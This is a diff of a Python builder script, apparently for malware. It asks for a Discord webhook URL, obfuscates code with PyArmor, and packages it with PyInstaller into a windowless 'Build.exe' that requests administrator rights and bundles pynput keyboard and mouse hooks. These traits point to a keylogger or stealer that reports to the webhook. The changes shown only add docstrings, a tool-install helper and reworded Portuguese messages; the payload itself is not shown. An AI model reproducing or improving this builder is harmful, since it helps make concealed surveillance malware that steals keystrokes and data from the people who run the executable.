@@ -4,16 +4,19 @@ import json
 import inquirer
 
 def load_config():
+    """Load configuration from the config.json file."""
     if os.path.exists("config.json"):
         with open("config.json", "r") as f:
             return json.load(f)
     return {}
 
 def save_config(config):
+    """Save the configuration to the config.json file."""
     with open("config.json", "w") as f:
         json.dump(config, f, indent=4)
 
 def select_options(config):
+    """Select options for the build."""
     choices = [key for key in config.keys() if key not in ["WEBHOOK", "ALERT_TITLE", "ALERT_CONTENT"]]
     
     questions = [
@@ -33,6 +36,7 @@ def select_options(config):
         ask_alert_details(config)
 
 def ask_webhook(config):
+    """Prompt the user for the Discord webhook URL."""
     questions = [
         inquirer.Text('WEBHOOK',
                       message="Enter your Discord Webhook URL:",
@@ -43,6 +47,7 @@ def ask_webhook(config):
     config["WEBHOOK"] = answers['WEBHOOK']
 
 def ask_alert_details(config):
+    """Prompt the user for alert details."""
     questions = [
         inquirer.Text('ALERT_TITLE', message="Enter the alert title:", default=config.get("ALERT_TITLE", "")),
         inquirer.Text('ALERT_CONTENT', message="Enter the alert content:", default=config.get("ALERT_CONTENT", "")),
@@ -51,12 +56,17 @@ def ask_alert_details(config):
     config["ALERT_TITLE"] = answers['ALERT_TITLE']
     config["ALERT_CONTENT"] = answers['ALERT_CONTENT']
 
-def compile_main(config):
+def check_installation(tool_name):
+    """Check if a tool is installed and install it if necessary."""
     try:
-        subprocess.run(["pyinstaller", "--version"], check=True, capture_output=True)
+        subprocess.run([tool_name, "--version"], check=True, capture_output=True)
     except subprocess.CalledProcessError:
-        print("PyInstaller não está instalado. Instalando...")
-        subprocess.run(["pip", "install", "pyinstaller"], check=True)
+        print(f"{tool_name} não está instalado. Instalando...")
+        subprocess.run(["pip", "install", tool_name], check=True)
+
+def compile_main(config):
+    check_installation("pyinstaller")
+    check_installation("pyarmor")
 
     try:
         print("Ofuscando o código com PyArmor...")
@@ -77,15 +87,16 @@ def compile_main(config):
     ]
 
     command.extend([
-        "--windowed",
-        "--uac-admin",
-        "--hidden-import=pynput.keyboard._win32",
+        "--windowed",  
+        "--uac-admin", 
+        "--hidden-import=pynput.keyboard._win32",  
         "--hidden-import=pynput.mouse._win32",
     ])
 
     try:
+        print("Criando o executável com PyInstaller...")
         subprocess.run(command, check=True)
-        print("Build criada.")
+        print("Build criada com sucesso.")
         print("O executável 'Build.exe' foi criado na pasta 'dist'.")
     except subprocess.CalledProcessError as e:
         print(f"Erro durante a compilação: {e}")
